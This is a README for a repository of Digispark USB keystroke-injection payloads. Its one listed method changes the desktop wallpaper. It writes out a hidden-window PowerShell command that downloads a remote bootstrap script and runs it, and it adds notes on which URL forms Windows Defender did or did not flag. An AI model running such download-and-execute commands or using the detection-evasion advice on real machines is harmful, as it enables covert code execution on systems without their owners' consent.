# digispark-payloads

A collection of lightweight payload methods for Digispark-based USB automation.

## Available Methods

| ID | Method             |
| -: | ------------------ |
|  1 | `change_wallpaper` |

## Usage

Run the bootstrap script directly with PowerShell and pass the method ID as an argument.

```cmd
powershell -W Hidden -Command "& ([ScriptBlock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/bootstrap.ps1'))) <METHOD_ID>"
```

### Example

Change the wallpaper using method `1`:

```cmd
powershell -W Hidden -Command "& ([ScriptBlock]::Create((irm 'https://raw.githubusercontent.com/phoenixthrush/digispark-payloads/refs/heads/main/bootstrap.ps1'))) 1"
```

## How It Works

* The bootstrap script acts as the main entry point and executes a selected method based on the provided parameter.
* `irm` (`Invoke-RestMethod`) is used to fetch the remote bootstrap script dynamically.
* `ScriptBlock::Create()` is used so arguments can be passed cleanly to the downloaded script.

## Detection Notes

* The command can be shortened using a URL shortener, although on my system shortened links were flagged by Windows Defender as `Trojan:Win32/ClickFix`.
* In testing on Windows LTSC Enterprise with the latest protection updates installed, the raw GitHub URL was not detected or flagged by Windows Defender on my machine.

## Digispark Setup

* Feel free to use `projects/invoke_script/basic_parameter.ino` as a base for flashing the payload onto a Digispark.
* You can simply change the method ID in the command to execute a different payload method.
* If you want to remove the default 5-second Digispark startup delay, check out my gist tutorial: [https://gist.github.com/phoenixthrush/168390df72f07776dd4b578600f9aeb6](https://gist.github.com/phoenixthrush/168390df72f07776dd4b578600f9aeb6)
* It is recommended to use `ArminJo/DigistumpArduino`, since the original Digistump packages and `ATTinyCore` by Spence Konde have been down for years and are more of a hassle to set up.

## Disclaimer

This repository is intended for educational and research purposes only. Ensure you have authorization before running payloads on any system.
